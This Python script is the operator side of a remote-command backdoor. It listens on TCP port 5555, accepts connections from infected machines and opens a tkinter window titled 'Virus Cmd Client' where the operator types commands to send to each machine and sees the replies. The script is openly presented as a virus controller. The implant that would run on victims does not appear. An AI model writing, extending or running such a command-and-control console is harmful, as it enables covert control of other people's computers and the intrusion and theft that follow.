import socket 
import threading
import tkinter

import os

def chat_gui(conn):

    def receive():
        """Handles receiving of messages."""
        while True:
            try:
                msg = client_socket.recv(BUFSIZ).decode("utf8")
                msg_list.insert(tkinter.END, '[Client]: '+msg)
            except OSError:  # Possibly client has left the chat.
                break




    def send(event=None):  # event is passed by binders.
        """Handles sending of messages."""
        msg = my_msg.get()
        print(msg)
      
        my_msg.set("")  # Clears input field.
        client_socket.send(bytes(msg, "utf8"))
        
        if msg == "{quit}":
            client_socket.close()
            top.quit()

    def on_closing(event=None):
        """This function is to be called when the window is closed."""
        top.destroy()
        conn.close()
        receive_thread.join()

    top =  tkinter.Tk()
    top.title(f"Virus Cmd Client")
    top.iconbitmap(os.path.dirname(os.path.abspath(__file__))+'\Radioactive.ico')
    messages_frame = tkinter.Frame(top)

    my_msg = tkinter.StringVar()  # For the messages to be sent.
    my_msg.set("Type your command here.")
    scrollbar = tkinter.Scrollbar(messages_frame)
    # To navigate through past messages.
    # Following will contain the messages.
    msg_list = tkinter.Listbox(messages_frame, height=25, width=80, yscrollcommand=scrollbar.set)
    scrollbar.pack(side=tkinter.RIGHT, fill=tkinter.Y)
    
    msg_list.pack(side=tkinter.LEFT, fill=tkinter.BOTH)
    msg_list.pack()
    messages_frame.pack()

    entry_field = tkinter.Entry(top, textvariable=my_msg)
    entry_field.bind("<Return>", send)
    entry_field.pack()
    send_button = tkinter.Button(top, text="Send", command=send)
    send_button.pack()

    top.protocol("WM_DELETE_WINDOW", on_closing)

    #----Now comes the sockets part----

    BUFSIZ = 1024*128


    client_socket = conn

    receive_thread = threading.Thread(target=receive)
    receive_thread.start()
    tkinter.mainloop()
    


HOST = ''               
PORT = 5555           
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen()


print('[Started]')

# def handle_client(conn):
#     while True:
#         msg = conn.recv(1024*16).decode()
#         print(msg)
#         id = threading.active_count()-1
#         cmd = input(f'Enter command id = {id}: ').encode()
#         conn.send(cmd)


while True:
	
    conn, addr = s.accept()
    print('Connected by', addr)
    chat_gui(conn)
    
    